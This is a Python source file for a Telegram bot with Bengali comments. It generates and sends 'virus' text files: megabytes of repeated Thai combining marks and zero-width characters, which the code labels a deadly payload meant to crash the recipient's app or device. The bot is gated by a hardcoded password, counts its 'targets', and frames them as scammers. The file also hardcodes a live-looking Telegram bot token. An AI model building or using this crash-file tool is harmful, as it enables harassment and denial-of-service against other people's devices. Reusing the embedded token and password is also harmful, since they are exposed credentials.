import logging
import sqlite3
import os
import time
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from telegram.ext import Application, MessageHandler, filters, ContextTypes, ConversationHandler

# ১. লগিং সেটআপ
logging.basicConfig(level=logging.WARNING)

# ২. কনফিগারেশন
TOKEN = "8675593212:AAG6_m5ZFEqG-qkutygxbuoOetMv9N87TnY"
CORRECT_PASSWORD = "MIZANUR RAHMAN"

# Conversation states
WAITING_FOR_PASSWORD = 1
WAITING_FOR_FILENAME = 2

# ৩. ডাটাবেস
def init_db():
    conn = sqlite3.connect('mr_dev_custom_v7.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS stats (id INTEGER PRIMARY KEY, count INTEGER)''')
    cursor.execute("INSERT OR IGNORE INTO stats (id, count) VALUES (1, 0)")
    conn.commit()
    conn.close()

# ৪. পেলোড জেনারেটর (পাওয়ারফুল ২-৫ এমবি)
async def generate_custom_payload(filename, status_msg):
    # ইউজার যদি নামের শেষে .txt না দেয়, বট নিজে লাগিয়ে দিবে
    if not filename.endswith(".txt"):
        filename += ".txt"
    
    file_path = filename
    crash_chars = "\u0E47\u0E48\u0E49\u0E4A\u0E4B\u0E4C\u0E4D" * 450 
    invisible_mass = "\u200B\u200C\u200D\uFEFF" * 250
    header = f"🔥 {filename.upper()}_DATABASE_☠️\n"
    
    deadly_chunk = (header + crash_chars + invisible_mass + "☣️") * 25
    
    try:
        await status_msg.edit_text(f"⏳ '{filename}' তৈরি হচ্ছে...")
        with open(file_path, "w", encoding="utf-8") as f:
            for i in range(1, 46):
                f.write(deadly_chunk)
        return file_path
    except Exception:
        return None

# ৫. হ্যান্ডলার ফাংশনসমূহ
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[KeyboardButton("🚀 CREATE VIRUS")], [KeyboardButton("📊 STATUS")]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text(
        f"🔥 **M R DEVELOPER ADVANCED PANEL** 🔥\n\nস্বাগতম! খেলা শুরু করতে নিচের বাটন চাপুন।",
        reply_markup=reply_markup
    )
    return ConversationHandler.END

async def ask_for_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔑 **পাসওয়ার্ড দিন:**", reply_markup=ReplyKeyboardRemove())
    return WAITING_FOR_PASSWORD

async def check_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == CORRECT_PASSWORD:
        await update.message.reply_text("✅ পাসওয়ার্ড সঠিক!\n\nএখন **ফাইলের নাম কী দিবেন?** তা লিখে পাঠান।\n(যেমন: `scammer_bash` বা `video_leak`)")
        return WAITING_FOR_FILENAME
    else:
        await update.message.reply_text("❌ ভুল পাসওয়ার্ড! আবার চেষ্টা করুন।")
        return WAITING_FOR_PASSWORD

async def create_and_send(update: Update, context: ContextTypes.DEFAULT_TYPE):
    custom_name = update.message.text.strip().replace(" ", "_") # স্পেস থাকলে আন্ডারস্কোর করে দিবে
    status_msg = await update.message.reply_text("🚀 প্রসেসিং শুরু হয়েছে...")
    
    file_path = await generate_custom_payload(custom_name, status_msg)
    
    if file_path and os.path.exists(file_path):
        try:
            with open(file_path, 'rb') as doc:
                await update.message.reply_document(
                    document=doc, 
                    caption=f"✅ **VIRUS READY!**\n\nফাইলের নাম: `{file_path}`\nএখন গোয়া মারার পালা! 🔥"
                )
            # পরিসংখ্যান আপডেট
            conn = sqlite3.connect('mr_dev_custom_v7.db')
            cur = conn.cursor()
            cur.execute("UPDATE stats SET count = count + 1 WHERE id=1")
            conn.commit()
            conn.close()
        except Exception:
            await update.message.reply_text("❌ ডেলিভারি এরর!")
        finally:
            if os.path.exists(file_path): os.remove(file_path)
    
    await status_msg.delete()
    keyboard = [[KeyboardButton("🚀 CREATE VIRUS")], [KeyboardButton("📊 STATUS")]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text("পরবর্তী টার্গেটের জন্য বাটন চাপুন।", reply_markup=reply_markup)
    return ConversationHandler.END

async def show_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    conn = sqlite3.connect('mr_dev_custom_v7.db')
    cur = conn.cursor()
    cur.execute("SELECT count FROM stats WHERE id=1")
    total = cur.fetchone()[0]
    conn.close()
    await update.message.reply_text(f"📊 মোট {total} জন স্ক্যামারের দফা রফা করা হয়েছে।")

# ৬. রানার
def main():
    init_db()
    application = Application.builder().token(TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('^🚀 CREATE VIRUS$'), ask_for_password)],
        states={
            WAITING_FOR_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, check_password)],
            WAITING_FOR_FILENAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, create_and_send)],
        },
        fallbacks=[MessageHandler(filters.Regex('^/start$'), start)],
    )

    application.add_handler(conv_handler)
    application.add_handler(MessageHandler(filters.Regex('^/start$'), start))
    application.add_handler(MessageHandler(filters.Regex('^📊 STATUS$'), show_status))
    
    print("M R DEVELOPER CUSTOM Bot is Online!")
    application.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    main()
    
